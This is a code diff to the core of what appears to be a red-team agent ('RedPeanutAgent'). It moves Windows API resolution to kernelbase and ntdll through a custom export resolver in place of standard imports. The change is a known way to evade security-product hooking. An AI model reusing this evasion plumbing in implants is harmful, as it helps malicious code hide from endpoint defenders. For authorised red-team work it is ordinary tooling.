@@ -1048,14 +1048,14 @@ namespace RedPeanutAgent.Core
 
         public static bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation)
         {
-            IntPtr proc = GetProcAddress(GetKernel32(), "CreateProcessA");
+            IntPtr proc = GetProcAddress(GetKernelbase(), "CreateProcessA");
             NativeSysCall.Delegates.CreateProcess CreateProcess = (NativeSysCall.Delegates.CreateProcess)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.CreateProcess));
             return CreateProcess(lpApplicationName, lpCommandLine, lpProcAttribs, lpThreadAttribs, bInheritHandles, dwCreateFlags, lpEnvironment, lpCurrentDir, ref lpStartinfo, out lpProcInformation);
         }
 
         public static bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFOEX lpStartinfo, out PROCESS_INFORMATION lpProcInformation)
         {
-            IntPtr proc = GetProcAddress(GetKernel32(), "CreateProcessA");
+            IntPtr proc = GetProcAddress(GetKernelbase(), "CreateProcessA");
             NativeSysCall.Delegates.CreateProcessEx CreateProcessEx = (NativeSysCall.Delegates.CreateProcessEx)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.CreateProcessEx));
             return CreateProcessEx(lpApplicationName, lpCommandLine, lpProcAttribs, lpThreadAttribs, bInheritHandles, dwCreateFlags, lpEnvironment, lpCurrentDir, ref lpStartinfo, out lpProcInformation);
         }
@@ -1094,16 +1094,6 @@ namespace RedPeanutAgent.Core
             NativeSysCall.Delegates.CreatePipe CreatePipe = (NativeSysCall.Delegates.CreatePipe)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.CreatePipe));
             return CreatePipe(out hReadPipe, out hWritePipe, ref lpPipeAttributes, nSize);
         }
-
-        /*public static bool ReadFile(IntPtr hFile, out byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped)
-        {
-            IntPtr proc = GetProcAddress(GetKernelbase(), "ReadFile");
-            NativeSysCall.Delegates.ReadFile ReadFile = (NativeSysCall.Delegates.ReadFile)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.ReadFile));
-            return ReadFile( hFile, out lpBuffer,  nNumberOfBytesToRead, out  lpNumberOfBytesRead,  lpOverlapped);
-        }*/
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);
-
 
         public static bool GetExitCodeProcess(IntPtr hProcess, out uint lpExitCode)
         {
@@ -1149,23 +1139,49 @@ namespace RedPeanutAgent.Core
 
         public static bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)
         {
-            IntPtr proc = GetProcAddress(GetKernel32(), "VirtualProtect");
+            IntPtr proc = GetProcAddress(GetKernelbase(), "VirtualProtect");
             NativeSysCall.Delegates.VirtualProtect VirtualProtect = (NativeSysCall.Delegates.VirtualProtect)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.VirtualProtect));
             return VirtualProtect(lpAddress, dwSize, flNewProtect, out lpflOldProtect);
         }
 
         public static bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint newprotect, out uint oldprotect)
         {
-            IntPtr proc = GetProcAddress(GetKernel32(), "VirtualProtectEx");
+            IntPtr proc = GetProcAddress(GetKernelbase(), "VirtualProtectEx");
             NativeSysCall.Delegates.VirtualProtectEx VirtualProtectEx = (NativeSysCall.Delegates.VirtualProtectEx)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.VirtualProtectEx));
             return VirtualProtectEx(hProcess, lpAddress, dwSize, newprotect, out oldprotect);
         }
 
-        [DllImport("kernel32")]
-        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        public static UInt32 LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref Natives.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle)
+        {
+            IntPtr proc = GetProcAddress(GetNtDll(), "LdrLoadDll");
+            NativeSysCall.Delegates.LdrLoadDll LdrLoadDll = (NativeSysCall.Delegates.LdrLoadDll)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.LdrLoadDll));
+            return (uint)LdrLoadDll(PathToFile, dwFlags, ref ModuleFileName, ref ModuleHandle);
+        }
 
-        [DllImport("kernel32")]
-        public static extern IntPtr LoadLibrary(string name);
+        public static void RtlInitUnicodeString(ref Natives.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString)
+        {
+            IntPtr proc = GetProcAddress(GetNtDll(), "RtlInitUnicodeString");
+            NativeSysCall.Delegates.RtlInitUnicodeString RtlInitUnicodeString = (NativeSysCall.Delegates.RtlInitUnicodeString)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.RtlInitUnicodeString));
+            RtlInitUnicodeString(ref DestinationString, SourceString);
+        }
+
+        public static bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped)
+        {
+            IntPtr proc = GetProcAddress(GetKernelbase(), "ReadFile");
+            NativeSysCall.Delegates.ReadFile ReadFile = (NativeSysCall.Delegates.ReadFile)Marshal.GetDelegateForFunctionPointer(proc, typeof(NativeSysCall.Delegates.ReadFile));
+            return ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, out lpNumberOfBytesRead, lpOverlapped);
+        }
+
+        public static IntPtr GetProcAddress(IntPtr hModule, string procName)
+        {
+            return CustomLoadLibrary.GetExportAddress(hModule, procName);
+        }
+
+
+        public static IntPtr LoadLibrary(string name)
+        {
+            return CustomLoadLibrary.GetDllAddress(name, true);
+        }
 
     }
 }
